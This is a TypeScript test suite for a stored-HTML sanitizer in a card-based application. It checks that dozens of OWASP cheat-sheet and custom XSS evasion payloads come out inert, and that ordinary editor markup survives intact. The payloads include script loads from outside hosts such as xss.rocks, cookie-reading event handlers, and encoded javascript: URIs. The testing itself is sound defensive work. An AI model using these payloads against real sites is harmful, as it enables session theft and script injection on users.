// The stored-HTML cleaner against hostile and malformed input.
//
// This suite pins three things:
//
//   1. No hostile input survives: the cleaned output passes an independent
//      browser-tokenizer check (html-safety-verifier.ts), alone and when the
//      page or another card's content follows it.
//   2. The verifier is not vacuous: its own unsafe-output checks are in a
//      set that is not part of the public package.
//   3. Ordinary content leaves nothing executable and is stable under a
//      second pass.
//
// The hostile cases follow the OWASP XSS Filter Evasion Cheat Sheet, plus the
// cleaner's own edge cases.

import { describe, expect, it } from "vitest";
import {
  cleanContent,
  decodeCharacterReferences,
  isSafeStyle,
  isSafeUrl,
  parseAttributes,
} from "../../../src/card/actions/content-clean.js";
import { htmlSafetyProblems } from "./html-safety-verifier.js";

const TAB = "\t";
const NUL = "\0";

/** OWASP XSS Filter Evasion Cheat Sheet vectors, as stored-content input. */
const OWASP: string[] = [
  `<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>`,
  `<IMG SRC="javascript:alert('XSS');">`,
  `<IMG SRC=javascript:alert('XSS')>`,
  `<IMG SRC=JaVaScRiPt:alert('XSS')>`,
  `<IMG SRC=javascript:alert(&quot;XSS&quot;)>`,
  "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
  `<a onmouseover="alert(document.cookie)">xxs link</a>`,
  `<a onmouseover=alert(document.cookie)>xxs link</a>`,
  `<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\\>`,
  `<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`,
  `<IMG SRC=# onmouseover="alert('xxs')">`,
  `<IMG SRC= onmouseover="alert('xxs')">`,
  `<IMG onmouseover="alert('xxs')">`,
  `<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`,
  `<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">`,
  `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,
  `<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`,
  `<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
  `<IMG SRC="jav${TAB}ascript:alert('XSS');">`,
  `<IMG SRC="jav&#x09;ascript:alert('XSS');">`,
  `<IMG SRC="jav&#x0A;ascript:alert('XSS');">`,
  `<IMG SRC="jav&#x0D;ascript:alert('XSS');">`,
  `<IMG SRC=java${NUL}script:alert("XSS")>`,
  `<IMG SRC=" &#14;  javascript:alert('XSS');">`,
  `<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>`,
  "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
  `<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>`,
  `<<SCRIPT>alert("XSS");//\\<</SCRIPT>`,
  `<SCRIPT SRC=http://xss.rocks/xss.js?< B >`,
  `<SCRIPT SRC=//xss.rocks/.j>`,
  `<IMG SRC="javascript:alert('XSS')"`,
  `<iframe src=http://xss.rocks/scriptlet.html <`,
  `\\";alert('XSS');//`,
  `</script><script>alert('XSS');</script>`,
  `</TITLE><SCRIPT>alert("XSS");</SCRIPT>`,
  `<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`,
  `<BODY BACKGROUND="javascript:alert('XSS')">`,
  `<IMG DYNSRC="javascript:alert('XSS')">`,
  `<IMG LOWSRC="javascript:alert('XSS')">`,
  `<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`,
  `<IMG SRC='vbscript:msgbox("XSS")'>`,
  `<IMG SRC="livescript:[code]">`,
  `<svg/onload=alert('XSS')>`,
  `<BODY ONLOAD=alert('XSS')>`,
  `<BGSOUND SRC="javascript:alert('XSS');">`,
  `<BR SIZE="&{alert('XSS')}">`,
  `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`,
  `<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">`,
  `<STYLE>@import'http://xss.rocks/xss.css';</STYLE>`,
  `<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">`,
  `<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>`,
  `<STYLE>@im\\port'\\ja\\vasc\\ript:alert("XSS")';</STYLE>`,
  `<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">`,
  `<STYLE TYPE="text/javascript">alert('XSS');</STYLE>`,
  `<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>`,
  `<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>`,
  `<XSS STYLE="behavior: url(xss.htc);">`,
  `<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`,
  `<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`,
  `<IFRAME SRC="javascript:alert('XSS');"></IFRAME>`,
  `<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>`,
  `<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>`,
  `<TABLE BACKGROUND="javascript:alert('XSS')">`,
  `<TABLE><TD BACKGROUND="javascript:alert('XSS')">`,
  `<DIV STYLE="background-image: url(javascript:alert('XSS'))">`,
  `<DIV STYLE="background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029">`,
  `<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">`,
  `<DIV STYLE="width: expression(alert('XSS'));">`,
  `<BASE HREF="javascript:alert('XSS');//">`,
  `<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>`,
  `<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>`,
  `<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>`,
  `<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert(&quot;XSS&quot;)</SCRIPT>"></BODY></HTML>`,
  `<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>`,
  `<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->`,
  `<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">`,
  `<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">`,
  `<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
  `<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
  `<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
  `<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
  "<SCRIPT a=`>` SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
  `<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
  `<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
  `<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>`,
  `<A HREF="http://www.google.com/ogle.com/">XSS</A>`,
];

/** Cases aimed at this cleaner's own structure: its regexes, the comment
 *  pass, the fragment's boundary with the page, and URL decoding. */
const TARGETED: string[] = [
  // A script-capable link target and a malformed tag.
  `<a href="javascript:alert(1)">click</a>`,
  `<img src=x"onerror="alert(1)>`,
  // An unterminated attribute value.
  `<a href='abc onmouseover=alert(1)>x</a>`,
  `<a href="abc onmouseover=alert(1)>x</a>`,
  // Comment removal splicing two fragments into a tag.
  `<<!-- -->img src=x onerror=alert(1)>`,
  `<<!-- x --><!-- y -->img src=x onerror=alert(1)>`,
  `<a title="<!--">--> " onmouseover="alert(1)">x</a>`,
  `<a title="<!--">x</a><b>--> " onmouseover="alert(1)"</b>`,
  // A fragment that ends inside markup and would absorb the page after it.
  `<img src=x onerror=alert(1) `,
  `<img src=x onerror=alert(1)`,
  `hello <`,
  `hello </`,
  `hello <!`,
  `hello <!-- open comment`,
  `hello <?`,
  `<!-- a`,
  // A "<" before an inclusion: the included card's text would complete a tag.
  `x <{{Other card|core}}`,
  // An attribute name inside another attribute's value.
  `<a title="href=javascript:alert(1)">x</a>`,
  `<a title="x href=javascript:alert(1)">x</a>`,
  `<a title="x>y" onclick=alert(1)>z</a>`,
  // Duplicate attributes: the browser keeps the first.
  `<a href="javascript:alert(1)" href="http://example.org/">x</a>`,
  `<a/href="javascript:alert(1)">x</a>`,
  `<a href=javascript:alert(1)//>x</a>`,
  `<a href="jav&#x09;ascript:alert(1)">x</a>`,
  `<a href="&#x6A;avascript:alert(1)">x</a>`,
  `<a href="java&Tab;script:alert(1)">x</a>`,
  `<a href="java&NewLine;script:alert(1)">x</a>`,
  `<a href="javascript&colon;alert(1)">x</a>`,
  `<a href="javascript&#58alert(1)">x</a>`,
  `<a href="javascript&#x3A;alert(1)">x</a>`,
  `<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">x</a>`,
  `<a href="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58alert(1)">x</a>`,
  `<a href="  javascript:alert(1)">x</a>`,
  `<a href="&#x20;javascript:alert(1)">x</a>`,
  `<a href="&nbsp;javascript:alert(1)">x</a>`,
  `<a href="\x01javascript:alert(1)">x</a>`,
  `<a href="java\x00script:alert(1)">x</a>`,
  `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`,
  `<a href="vbscript:msgbox(1)">x</a>`,
  `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`,
  `<blockquote cite="javascript:alert(1)">q</blockquote>`,
  `<p style="x:expression(alert(1))">p</p>`,
  `<span style="background:url(&quot;javascript:alert(1)&quot;)">s</span>`,
  `<span style="background:url(java&#x09;script:alert(1))">s</span>`,
  `<span style="background:url(j\\61vascript:alert(1))">s</span>`,
  `<table data-mce-style="width:expression(alert(1))"><tr><td>t</td></tr></table>`,
  `<td data-mce-style="background:url(javascript:alert(1))">t</td>`,
  "<img src=\"x` `<script>alert(1)</script>\"` `>",
  `<div><!--\n<img src=x onerror=alert(1)>\n--></div>`,
  `<![CDATA[<img src=x onerror=alert(1)>]]>`,
  `<math><mi xlink:href="data:x,<script>alert(4)</script>">`,
  `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
  `<table><td background=javascript:alert(1)>`,
  `<ScRiPt>alert(1)</sCrIpT>`,
  `<img src="x" alt="&quot; onerror=&quot;alert(1)">`,
  `<span class='w-a" onclick="alert(1)'>x</span>`,
  `<span class="w-a' onclick='alert(1)">x</span>`,
  `<span class=w-a"onclick="alert(1)>x</span>`,
  `<p title=x"onmouseover="alert(1)>p</p>`,
  `<a href=x"onmouseover="alert(1)>a</a>`,
  `<a target=_blank"onclick="alert(1)>a</a>`,
  `<img alt=a"onerror="alert(1) src=x>`,
  `<a\nhref\n=\n"javascript:alert(1)">x</a>`,
  `<a href="javascript:alert(1)"\n>x</a>`,
  `<a href = 'javascript:alert(1)'>x</a>`,
  `<A HREF="JAVASCRIPT:alert(1)">x</A>`,
  `<p/onclick=alert(1)>x</p>`,
  `<p onclick=alert(1)/>x</p>`,
  `<div =onclick=alert(1)>x</div>`,
  `<img src=x onerror=alert(1)//`,
  `<<img src=x onerror=alert(1)//<`,
  `<scr<script>ipt>alert(1)</scr</script>ipt>`,
  `<a href="http://example.org/" title='"><script>alert(1)</script>'>x</a>`,
];

const SUFFIXES = [
  "",
  "img src=x onerror=alert(1)>",
  `" onmouseover="alert(1)">`,
  "' onmouseover='alert(1)'>",
  "</div><p>page</p>",
];

function assertSafe(input: string): void {
  const out = cleanContent(input);
  for (const suffix of SUFFIXES) {
    // The page (or another card's cleaned content) follows the fragment.
    const followed = suffix === "" ? out : out + cleanContent(suffix);
    expect({ input, suffix, out, problems: htmlSafetyProblems(followed) }).toEqual({
      input,
      suffix,
      out,
      problems: [],
    });
  }
  // Cleaning is stable: storing the cleaned content again changes nothing.
  expect(cleanContent(out)).toBe(out);
}

describe("cleanContent: hostile input", () => {
  it.each(OWASP.map((s, i) => [i, s]))("OWASP vector %i leaves nothing executable", (_i, input) => {
    assertSafe(input as string);
  });

  it.each(TARGETED.map((s, i) => [i, s]))("targeted vector %i leaves nothing executable", (_i, input) => {
    assertSafe(input as string);
  });

  it("random mixtures of hostile fragments leave nothing executable", () => {
    const parts = [
      "<", ">", "<a ", "<img ", "<p ", "<span ", "<td ", "<!--", "-->", "--!>", "\n", " ", "/", "=",
      '"', "'", "`", "href=", "src=", "title=", "style=", "class=", "onerror=", "onclick=",
      "javascript:", "jav&#x09;ascript:", "&colon;", "alert(1)", "x", "w-a", "<script>", "</a>",
      "{{", "}}", "&", "&#", ";", "url(", "expression(", "<!", "<?", "</",
    ];
    let seed = 20261008;
    const rand = (n: number): number => {
      seed = (Math.imul(seed, 1103515245) + 12345) >>> 0;
      return seed % n;
    };
    for (let k = 0; k < 4000; k++) {
      let input = "";
      const len = 1 + rand(14);
      for (let j = 0; j < len; j++) input += parts[rand(parts.length)];
      const out = cleanContent(input);
      const problems = htmlSafetyProblems(out);
      if (problems.length > 0) expect({ input, out, problems }).toEqual({ input, out, problems: [] });
      expect(cleanContent(out)).toBe(out);
    }
  });
});

describe("cleanContent: markup the cleaner rewrites", () => {
  it("drops a javascript: link target and keeps the link text", () => {
    expect(cleanContent(`<a href="javascript:alert(1)">click</a>`)).toBe("<a>click</a>");
  });

  it("keeps a malformed bare value as one escaped value", () => {
    expect(cleanContent(`<img src=x"onerror="alert(1)>`)).toBe(`<img src="x&quot;onerror=&quot;alert(1)">`);
  });

  it("the cleaned output of the splice, the open quote and the open tag passes the verifier", () => {
    for (const input of [
      `<<!-- -->img src=x onerror=alert(1)>`,
      `<a title="<!--">--> " onmouseover="alert(1)">x</a>`,
      `<a href='abc onmouseover=alert(1)>x</a>`,
      `<img src=x onerror=alert(1) `,
    ]) {
      expect(htmlSafetyProblems(cleanContent(input))).toEqual([]);
    }
  });

  it("writes what the splice and the open tag become", () => {
    expect(cleanContent(`<<!-- -->img src=x onerror=alert(1)>`)).toBe("&lt;img src=x onerror=alert(1)>");
    expect(cleanContent(`<img src=x onerror=alert(1) `)).toBe("&lt;img src=x onerror=alert(1) ");
    expect(cleanContent(`<a href='abc onmouseover=alert(1)>x</a>`)).toBe(
      "<a href='abc onmouseover=alert(1)'>x</a>",
    );
  });
});

/** Ordinary content: what an editor produces. Every case must clean to
 *  something a browser acts on nothing in, and must be stable under a second
 *  pass. */
const ORDINARY: string[] = [
  "<p>Plain paragraph.</p>",
  "<p>Text with <strong>bold</strong>, <em>italic</em>, <b>b</b>, <i>i</i>, <sup>2</sup>, <sub>x</sub>, <del>old</del> and <ins>new</ins>.</p>",
  `<p><a href="http://example.org/page?a=1&amp;b=2">link</a> <a href="https://example.org/" target="_blank" title="Example">ex</a></p>`,
  `<a href="mailto:someone@example.org">mail</a> <a href="tel:510-555-0100">call</a> <a href="skype:someone?call">skype</a>`,
  `<a href="/Some_Card">card</a> <a href="Relative_Card">rel</a> <a href="#section">anchor</a> <a href="?view=edit">q</a> <a href="//cdn.example.org/x">proto</a>`,
  `<a href="Some Page: with a colon">odd but relative</a>`,
  `<img src="https://example.org/a.png" alt="An image" title="Title"> <img src="/files/~123/456-medium.jpg" alt="x">`,
  `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==">`,
  `<table border="1" cellpadding="2" cellspacing="0" style="width: 100%;"><tbody><tr><th scope="col">H</th></tr><tr><td style="text-align: center;">c</td></tr></tbody></table>`,
  `<div style="background-image: url('https://example.org/bg.png'); color: #333;">bg</div>`,
  `<ul type="disc"><li>one</li><li>two</li></ul><ol type="1"><li>a</li></ol>`,
  `<blockquote cite="https://example.org/source">quoted</blockquote> <code lang="ruby">x = 1</code> <pre>pre  text</pre>`,
  `<span class="w-highlight w-note">kept classes</span> <span class='w-a'>single</span>`,
  `<h1>H1</h1><h2>H2</h2><h3>H3</h3><h4>H4</h4><h5>H5</h5><h6>H6</h6><hr><br><br/>`,
  "<p>a &nbsp;&nbsp;b and a &lt; b, 3 < 4 and 5 > 2, x<5 &amp; y</p>",
  "<p>Nested {{Some Card|core}} and [[Linked Card|label]] syntax.</p>",
  "<p>before</p><!--\nmulti-line comment\n--><p>after</p>",
  "<p>before</p><!-- one-line comment --><p>after</p>",
  "<!--[if gte mso 9]><xml>\n<w:WordDocument></w:WordDocument>\n</xml><![endif]--><p class=\"MsoNormal\">Word</p>",
  "<p><![if !supportLists]>1.<![endif]>Item</p>",
  "<p>Line one\r\nLine two</p>\r\n<p>CRLF</p>",
  `<p style="margin: 0px; font-family: &quot;Helvetica Neue&quot;;">quoted font</p>`,
  "<div><span>café — 日本</span></div>",
  `<a href="https://example.org/a b">space in URL</a>`,
  `<p>Removed tags become spaces: <font color="red">red</font> and <u>under</u>.</p>`,
  `<p onclick="x()">event handlers go</p><script>bad()</script>`,
  `<td colspan="2" scope="row" style="width: 10px;" data-mce-style="width: 10px;">cell</td>`,
];

describe("cleanContent: ordinary content", () => {
  it.each(ORDINARY.map((s, i) => [i, s]))("ordinary case %i leaves nothing executable and is stable", (_i, input) => {
    const out = cleanContent(input as string);
    expect(htmlSafetyProblems(out)).toEqual([]);
    expect(cleanContent(out)).toBe(out);
  });
});

describe("cleaner building blocks", () => {
  it("parses attributes with the browser's tokenizer rules", () => {
    expect(parseAttributes(` src=x"onerror="alert(1)`).attributes).toEqual([
      { name: "src", value: `x"onerror="alert(1)`, quote: "" },
    ]);
    expect(parseAttributes(` alt="""" /`).attributes.map((a) => a.name)).toEqual(["alt", `""`]);
    expect(parseAttributes(` HREF='a'title="b"`).attributes).toEqual([
      { name: "href", value: "a", quote: "'" },
      { name: "title", value: "b", quote: '"' },
    ]);
    expect(parseAttributes(` title="open`).unterminatedQuote).toBe(true);
  });

  it("decodes character references more eagerly than a browser", () => {
    expect(decodeCharacterReferences("&#106;&#x61;&#0000118a&colon&Tab;&NewLine;")).toBe("java:\t\n");
    expect(decodeCharacterReferences("&colonx")).toBe(":x");
  });

  it("accepts ordinary URLs and refuses script-capable ones", () => {
    for (const ok of ["http://a", "HTTPS://a", "mailto:a@b", "tel:1", "/x", "x", "#a", "?a", "//h/x", "a b: c", "/x:y"]) {
      expect({ ok, safe: isSafeUrl(ok, false) }).toEqual({ ok, safe: true });
    }
    for (const bad of ["javascript:x", "JaVaScRiPt:x", " javascript:x", "java\tscript:x", "jav&#x09;ascript:x", "vbscript:x", "data:text/html,x", "blob:http://a/b", "file:///x", "&unknown;javascript:x"]) {
      expect({ bad, safe: isSafeUrl(bad, false) }).toEqual({ bad, safe: false });
    }
    expect(isSafeUrl("data:image/png;base64,AAAA", true)).toBe(true);
    expect(isSafeUrl("data:image/png;base64,AAAA", false)).toBe(false);
    expect(isSafeUrl("data:image/svg+xml;base64,AAAA", true)).toBe(false);
  });

  it("accepts ordinary styles and refuses script-capable ones", () => {
    expect(isSafeStyle("color: red; background: url('https://a/b.png')")).toBe(true);
    for (const bad of ["width:expression(1)", "x:expr/**/ession(1)", "background:url(javascript:1)", "-moz-binding:url(x)", "behavior: url(x.htc)", "@import 'x'", "background:url(j\\61vascript:1)"]) {
      expect({ bad, safe: isSafeStyle(bad) }).toEqual({ bad, safe: false });
    }
  });
});
